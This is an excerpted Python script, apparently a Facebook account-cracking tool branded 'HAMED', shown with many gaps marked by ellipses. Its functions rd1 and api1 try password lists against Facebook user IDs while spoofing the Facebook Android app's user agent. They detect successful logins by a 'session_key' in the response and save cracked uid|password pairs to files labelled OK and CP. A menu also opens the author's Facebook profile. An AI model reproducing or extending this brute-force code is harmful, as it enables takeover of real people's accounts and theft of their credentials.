...
def ADEEL ():
		...
		if shm =='1':
			...
			os.system('xdg-open https://https://www.facebook.com/profile.php?id=100078297285634')
			ADEEL ()
		elif shm =='7':
			os.system('xdg-open https://www.facebook.com/profile.php?id=100078297285634')
			ADEEL ()
...
def rd1(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\33[1;37m[ HAMED ]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				...
				ua  = "Dalvik/2.0.0 (Linux; U; Android 11; Motorola Edge+ Build/RP1A.200720.012) [FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/{density=3.2,width=1080,height=2340};FBLC/en_US;FBRV/'+str(random.randint(10000000, 99999999))+';FBCR/Motorola;FBMF/Edge+;FBBD/Edge+;FBPN/com.facebook.katana;FBDV/Edge+;FBSV/11;FBOP/1;FBCA/arm64-v8a;]"
				...
				if 'session_key' in po:
					...
					#	print(f'\r\r\33[1m\33[1;35m [SIALXD-CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'HAMED -CP.txt')
...
def api1(ids,names,passlist):
	try:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					uid = str(po['uid'])
					print('\r\r\033[1;32m [HAMED-OK] '+uid+' | '+pas)
					linex()
					file_path = os.path.join(folder_path, 'HAMED _FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
					...
					uid = str(po['error']['error_data']['uid'])
			#		print(f'\r\r\33[1m\33[1;35m [HAMED-CP] '+uid+' | '+pas+'\033[1;97m')
					file_path = os.path.join(folder_path, 'HAMED-CP.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					cps.append(uid)
